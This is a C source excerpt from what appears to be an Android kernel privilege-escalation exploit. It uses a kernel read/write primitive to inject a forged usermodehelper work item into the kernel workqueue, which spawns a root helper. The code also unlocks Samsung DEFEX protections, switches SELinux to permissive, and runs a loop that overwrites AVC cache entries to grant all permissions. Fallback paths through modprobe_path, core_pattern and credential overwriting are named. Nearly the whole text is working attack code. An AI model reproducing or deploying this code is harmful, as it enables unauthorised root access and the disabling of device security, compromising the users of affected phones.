  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t cmd_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, cmd);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  if (shell_proof_runtime) {
    umh_data.argv[2] = cmd_addr;
    umh_data.argv[3] = 0;
    umh_data.argv[4] = 0;
  } else {
#if defined(ROOT_UMH_SETENFORCE_ONLY) && ROOT_UMH_SETENFORCE_ONLY
    umh_data.argv[2] = 0;
    umh_data.argv[3] = 0;
    umh_data.argv[4] = 0;
#else
    umh_data.argv[2] = uid_addr;
    umh_data.argv[3] = 0;
    umh_data.argv[4] = 0;
#endif
  }
  umh_data.envp[0] = 0;
  int helper_fd = -1;
  uintptr_t helper_file = 0;
  if (!use_path_exec) {
    helper_fd = open(root_umh_path, O_RDONLY | O_CLOEXEC);
    helper_file = root_file_for_fd(fd, helper_fd);
    if (helper_fd < 0 || !helper_file) {
      pr_warning("root umh helper file lookup failed path=%s fd=%d file=%016zx errno=%d\n",
                 root_umh_path, helper_fd, helper_file, errno);
      if (helper_fd >= 0) {
        close(helper_fd);
      }
      return 0;
    } else {
      pr_info("root umh using file exec path=%s fd=%d file=%016zx\n",
              root_umh_path, helper_fd, helper_file);
    }
  } else {
    pr_info("root umh using path exec path=%s shell_proof=%d\n",
            root_umh_path, shell_proof_runtime);
  }

  uint32_t callback_sid = 0;
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
  if (!root_read_task_sid(fd, getpid(), &callback_sid)) {
    if (helper_fd >= 0) {
      close(helper_fd);
    }
    pr_error("root umh could not resolve shell SID\n");
    return 0;
  }
#endif

  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  if (getenv("ROOT_UMH_DRYRUN")) {
    uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
    uintptr_t wq = root_read64(fd, wq_slot);
    uintptr_t pwq = is_direct_ptr(wq) ? root_read64(fd, wq + WQ_DFL_PWQ_OFF) : 0;
    uintptr_t pool = is_direct_ptr(pwq) ? root_read64(fd, pwq + PWQ_POOL_OFF) : 0;
    uintptr_t pwq_wq = is_direct_ptr(pwq) ? root_read64(fd, pwq + PWQ_WQ_OFF) : 0;
    uintptr_t worklist = is_direct_ptr(pool) ? pool + POOL_WORKLIST_OFF : 0;
    uint64_t list_next = worklist ? root_read64(fd, worklist) : 0;
    uint64_t list_prev = worklist ? root_read64(fd, worklist + sizeof(uint64_t)) : 0;
    uint32_t nr_idle = is_direct_ptr(pool) ? root_read32(fd, pool + POOL_NR_IDLE_OFF) : 0;
    uint32_t color = is_direct_ptr(pwq) ? root_read32(fd, pwq + PWQ_WORK_COLOR_OFF) : 0xffffffffU;
    uint32_t refcnt = is_direct_ptr(pwq) ? root_read32(fd, pwq + PWQ_REFCNT_OFF) : 0;
    uint32_t nr_active = is_direct_ptr(pwq) ? root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF) : 0;
    uint32_t max_active = is_direct_ptr(pwq) ? root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF) : 0;
    pr_info("root umh dryrun wq_slot=%016zx wq=%016zx pwq=%016zx pool=%016zx pwq_wq=%016zx worklist=%016zx list=%016llx/%016llx idle=%u color=%u refcnt=%u active=%u/%u\n",
            wq_slot, wq, pwq, pool, pwq_wq, worklist,
            (unsigned long long)list_next, (unsigned long long)list_prev,
            nr_idle, color, refcnt, nr_active, max_active);
    return 0;
  }

  unlink(ROOT_SOCKET_PATH);
#if defined(ROOT_SKIP_DEFEX_WRITE) && ROOT_SKIP_DEFEX_WRITE
  pr_info("root umh skipping defex writes\n");
#else
  uint8_t defex_unlocked = 1;
  uint8_t defex_soft = 2;
  ssize_t defex_boot_write = kernel_write_data(
      fd, data_addr(DEFEX_BOOT_STATE_UNLOCKED), &defex_unlocked,
      sizeof(defex_unlocked));
  ssize_t defex_priv_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_PRIVESC_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_safe_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_SAFEPLACE_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_int_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_INTEGRITY_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_imm_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_IMMUTABLE_STATUS), &defex_soft,
      sizeof(defex_soft));
  pr_info("root umh defex writes boot=%zd priv=%zd safe=%zd int=%zd imm=%zd\n",
          defex_boot_write, defex_priv_write, defex_safe_write,
          defex_int_write, defex_imm_write);
#endif
  int skip_selinux_runtime = getenv("ROOT_UMH_SKIP_SELINUX_WRITE_RUNTIME") != NULL;
  uint8_t selinux_before = 0xff;
  int selinux_before_ok = 0;
  if (!skip_selinux_runtime) {
    selinux_before_ok = root_read_data(
        fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  }
#if defined(ROOT_SKIP_SELINUX_WRITE) && ROOT_SKIP_SELINUX_WRITE
  ssize_t selinux_write = sizeof(permissive);
  pr_info("root umh skipping selinux write target=%016zx\n", selinux_addr);
#else
  ssize_t selinux_write = sizeof(permissive);
  if (skip_selinux_runtime) {
    pr_info("root umh skipping selinux write by env target=%016zx\n",
            selinux_addr);
  } else {
    selinux_write = kernel_write_data(
        fd, selinux_addr, &permissive, sizeof(permissive));
  }
#endif
  uint8_t selinux_after = 0xff;
  int selinux_after_ok = 0;
  if (!skip_selinux_runtime) {
    selinux_after_ok = root_read_data(
        fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  }
  pr_info("root umh selinux write ret=%zd target=%016zx before=%02x/%d "
          "after=%02x/%d\n",
          selinux_write, selinux_addr, selinux_before, selinux_before_ok,
          selinux_after, selinux_after_ok);
  if (selinux_write != (ssize_t)sizeof(permissive)) {
    pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
    return 0;
  }
  if (getenv("ROOT_UMH_SELINUX_DIAG_ONLY")) {
    uint8_t enforcing = 1;
    ssize_t selinux_restore = kernel_write_data(
        fd, selinux_addr, &enforcing, sizeof(enforcing));
    uint8_t selinux_final = 0xff;
    int selinux_final_ok = root_read_data(
        fd, selinux_addr, &selinux_final, sizeof(selinux_final));
    pr_info("root umh selinux diag-only restore=%zd final=%02x/%d\n",
            selinux_restore, selinux_final, selinux_final_ok);
    return 0;
  }

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uintptr_t wq = root_read64(fd, wq_slot);
  uintptr_t pwq = root_read64(fd, wq + WQ_DFL_PWQ_OFF);
  uintptr_t pool = root_read64(fd, pwq + PWQ_POOL_OFF);
  uintptr_t pwq_wq = root_read64(fd, pwq + PWQ_WQ_OFF);
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    list_next = root_read64(fd, worklist);
    list_prev = root_read64(fd, worklist + sizeof(uint64_t));
    nr_idle = root_read32(fd, pool + POOL_NR_IDLE_OFF);
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }

  uint32_t color = root_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
  uint32_t refcnt = root_read32(fd, pwq + PWQ_REFCNT_OFF);
  uint32_t nr_active = root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
  uint32_t max_active = root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = root_read32(fd, inflight_addr);
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
#if defined(LEGACY_UMH_SUBPROCESS_INFO) && LEGACY_UMH_SUBPROCESS_INFO
  if (!use_path_exec) {
    fake.file = helper_file;
  }
#endif
  fake.argv = argv_addr;
  fake.envp = envp_addr;
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
  struct umh_completion callback_completion;
  memset(&callback_completion, 0, sizeof(callback_completion));
  uintptr_t callback_completion_addr =
      fake_work_addr + ROOT_UMH_CALLBACK_COMPLETION_OFF;
  uintptr_t callback_wait_list = callback_completion_addr +
      offsetof(struct umh_completion, next);
  callback_completion.next = callback_wait_list;
  callback_completion.prev = callback_wait_list;
  fake.init = text_addr(ROOT_UMH_CALLBACK_WRAPPER);
  fake.cleanup = text_addr(ROOT_UMH_CALLBACK_WAIT);
#endif

  struct umh_file_override file_override;
  memset(&file_override, 0, sizeof(file_override));
  uint64_t helper_old_count = 0;
  if (!use_path_exec &&
      (!root_override_umh_helper(fd, helper_file, &file_override) ||
       !root_hold_umh_file_ref(fd, helper_file, &helper_old_count))) {
    root_restore_umh_helper(fd, &file_override);
    return 0;
  }

  uintptr_t old_task_tail = 0;
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
  uintptr_t task_head = data_addr(INIT_TASK) + TASK_STRUCT_TASKS_OFF;
  old_task_tail = root_read64(fd, task_head + sizeof(uint64_t));
  if (!is_direct_ptr(old_task_tail)) {
    if (helper_old_count) {
      root_write64(fd, helper_file + FILE_F_COUNT_OFF, helper_old_count);
    }
    root_restore_umh_helper(fd, &file_override);
    return 0;
  }
#endif

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  int callback_write = 1;
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
  callback_write = root_write_data(
      fd, callback_completion_addr, &callback_completion,
      sizeof(callback_completion));
#endif
  int counters_write =
      root_write32(fd, inflight_addr, nr_inflight + 1) &&
      root_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) &&
      root_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  int list_prev_write = root_write64(
      fd, worklist + sizeof(uint64_t), fake_entry);
  int list_next_write = list_prev_write && root_write64(
      fd, worklist, fake_entry);
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          callback_write, counters_write, list_prev_write, list_next_write);
  fflush(NULL);
  if (!data_write || !work_write || !callback_write ||
      !counters_write || !list_next_write) {
    if (helper_old_count) {
      root_write64(fd, helper_file + FILE_F_COUNT_OFF, helper_old_count);
    }
    root_restore_umh_helper(fd, &file_override);
    return 0;
  }

  uint32_t complete_done = 0;
  int wake_ok = 0;
  int callback_cred_ok = 0;
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
  wake_ok |= wake_system_unbound();
  callback_cred_ok = root_umh_patch_callback_cred(
      fd, old_task_tail, fake_work_addr, callback_sid);
#endif
  for (int i = 0; i < 8 && !complete_done; i++) {
    if (i > 0) {
      wake_ok |= wake_system_unbound();
    }
    for (int j = 0; j < 250; j++) {
      complete_done = root_read32(fd, completion_addr);
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int socket_ok = 0;
  int proof_ok = 0;
  uint32_t umh_sid = callback_sid;
  int32_t umh_retval = (int32_t)root_read32(
      fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval));
  if (complete_done && root_umh_callback_pid) {
    root_read_task_sid(fd, (int)root_umh_callback_pid, &umh_sid);
  }
  root_umh_runtime_sid = umh_sid;
  if (complete_done) {
    if (shell_proof_runtime) {
      for (int i = 0; i < 200; i++) {
        if (root_proof_ready()) {
          proof_ok = 1;
          break;
        }
        usleep(10000);
      }
    } else {
      for (int i = 0; i < 200; i++) {
        if (root_socket_ready()) {
          socket_ok = 1;
          break;
        }
        usleep(10000);
      }
    }
  }
  if (complete_done && !shell_proof_runtime) {
    int avc_ok = 0;
    for (int i = 0; i < 500 && !avc_ok; i++) {
      avc_ok = root_grant_setenforce_avc(fd, umh_sid);
      if (!avc_ok) {
        usleep(10000);
      }
    }
    uint8_t enforcing = 1;
    int domain_permissive = avc_ok &&
        root_make_umh_domain_permissive(fd, umh_sid);
    int cached_permissive = 0;
    for (int i = 0; domain_permissive && i < 20 && !cached_permissive; i++) {
      cached_permissive = root_mark_cached_domain_permissive(fd, umh_sid);
      if (!cached_permissive) {
        usleep(10000);
      }
    }
    for (int i = 0; avc_ok && i < 200 && enforcing; i++) {
      root_read_data(fd, selinux_addr, &enforcing, sizeof(enforcing));
      if (enforcing) {
        usleep(10000);
      }
    }
    proof_ok = root_avc_status | (domain_permissive ? 64 : 0) |
        (cached_permissive ? 128 : 0);
    socket_ok = avc_ok && domain_permissive;
  }
  int helper_restore = complete_done
      ? root_restore_umh_helper(fd, &file_override) : 0;
  if (helper_fd >= 0) {
    close(helper_fd);
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d proof=%d "
          "restore=%d callback=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok, proof_ok,
          helper_restore, callback_cred_ok);
#if defined(ROOT_UMH_SETENFORCE_ONLY) && ROOT_UMH_SETENFORCE_ONLY
  root_child_done = complete_done && umh_retval == 0;
  root_uid_after = root_uid_before;
  return root_child_done;
#else
  if (shell_proof_runtime) {
    root_child_done = proof_ok;
    root_uid_after = proof_ok ? 0 : root_uid_before;
    return proof_ok;
  }
  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return socket_ok;
#endif
}

__attribute__((used, noinline, naked))
static void root_m53_keeper_text_pad(void) {
  __asm__ volatile("nop\nnop\nnop");
}

int install_android_root(int fd) {
  root_uid_before = getuid();
  pr_info("root start uid=%u fd=%d\n", root_uid_before, fd);
  int installed = 0;

  if (getenv("ROOT_USE_DIRECT_CRED_RUNTIME")) {
    return install_direct_cred_root(fd);
  }
  if (getenv("ROOT_USE_MODPROBE_PATH")) {
    installed = install_modprobe_path_root(fd);
    return installed;
  }
  if (getenv("ROOT_USE_CORE_PATTERN")) {
    installed = install_core_pattern_root(fd);
    return installed;
  }
  if (getenv("ROOT_USE_UMH_WORKQUEUE")) {
    installed = install_workqueue_umh_root(fd);
    return installed;
  }
#if defined(ROOT_UMH_CALLBACK_CRED_DEFAULT) && \
    ROOT_UMH_CALLBACK_CRED_DEFAULT
  return install_workqueue_umh_root(fd);
#endif

#if defined(ROOT_USE_DIRECT_CRED) && ROOT_USE_DIRECT_CRED
  installed = install_direct_cred_root(fd);
  if (!installed) {
#if defined(ROOT_DISABLE_UMH_FALLBACK) && ROOT_DISABLE_UMH_FALLBACK
    pr_warning("root direct cred failed, UMH fallback disabled\n");
#else
    pr_warning("root direct cred failed, falling back to UMH workqueue\n");
    installed = install_workqueue_umh_root(fd);
#endif
  }
#else
  installed = install_workqueue_umh_root(fd);
#endif
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  if (installed && (p0_gate_page_struct || p0_probe_page_struct)) {
#else
  if (installed) {
#endif
    int holder_ready = 0;
    for (int attempt = 0; attempt < 200; attempt++) {
      if (root_hold_socket_ready()) {
        holder_ready = 1;
        break;
      }
      usleep(10000);
    }
    pr_info("root p0 reference holder ready=%d\n", holder_ready);
    if (!holder_ready) {
      root_child_done = 0;
      root_uid_after = root_uid_before;
      return 0;
    }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  } else if (installed) {
    pr_info("root p0 reference holder not required for cached virtual base\n");
#endif
  }
#endif
  return installed;
}

__attribute__((visibility("hidden")))
void root_avc_autogrant_loop(int fd) {
  const uint32_t keeper_threshold = 0x00100000U;
  uintptr_t seen_heads[512] = {0};
  uintptr_t avc = root_read64(fd, data_addr(SELINUX_STATE) + 0x10);
  if (!is_direct_ptr(avc)) {
    avc = data_addr(SELINUX_AVC);
  }

  uint32_t old_threshold = 0;
  if (!root_read32_checked(fd, avc, &old_threshold) ||
      !root_write32(fd, avc, keeper_threshold)) {
    return;
  }

  /* Let any reclaim that started before the threshold update finish. */
  usleep(500000);

  for (;;) {
    uintptr_t slots[512];
    size_t slots_read = 0;
    while (slots_read < sizeof(slots)) {
      uintptr_t target = avc + 8 + slots_read;
      size_t chunk = 4096 - (target & 4095);
      if (chunk > sizeof(slots) - slots_read) {
        chunk = sizeof(slots) - slots_read;
      }
      if (!root_read_data(fd, target,
                          (uint8_t *)slots + slots_read, chunk)) {
        slots_read = 0;
        break;
      }
      slots_read += chunk;
    }
    if (slots_read != sizeof(slots)) {
      usleep(100000);
      continue;
    }
    for (uint32_t slot = 0; slot < 512; slot++) {
      if (slots[slot] == seen_heads[slot]) {
        continue;
      }
      uintptr_t stop = seen_heads[slot];
      uintptr_t list = slots[slot];
      uintptr_t current_head = 0;
      if (!root_read64_checked(
              fd, avc + 8 + (uintptr_t)slot * 8, &current_head) ||
          current_head != list) {
        continue;
      }
      int complete = 0;
      for (int i = 0; i < 64 && is_direct_ptr(list) && list != stop; i++) {
        uintptr_t node = list - 40;
        uint32_t ssid = 0;
        uint32_t tsid = 0;
        uint32_t tclass_word = 0;
        uintptr_t next = 0;
        if (!root_read32_checked(fd, node, &ssid) ||
            !root_read32_checked(fd, node + 4, &tsid) ||
            !root_read32_checked(fd, node + 8, &tclass_word) ||
            !root_read64_checked(fd, node + 40, &next)) {
          break;
        }
        uint32_t tclass = tclass_word & 0xffffU;
        uint32_t expected_slot =
            (ssid ^ (tsid << 2) ^ (tclass << 4)) & 511U;
        if (!ssid || !tsid || !tclass || tclass > 255U ||
            expected_slot != slot ||
            (next && !is_direct_ptr(next)) || next == list) {
          break;
        }
        if (!root_write32(fd, node + 12, 0xffffffffU)) {
          break;
        }
        list = next;
        complete = !list || list == stop;
      }
      if (list == stop) {
        complete = 1;
      }
      if (complete) {
        seen_heads[slot] = slots[slot];
      }
    }
    usleep(100000);
  }
}
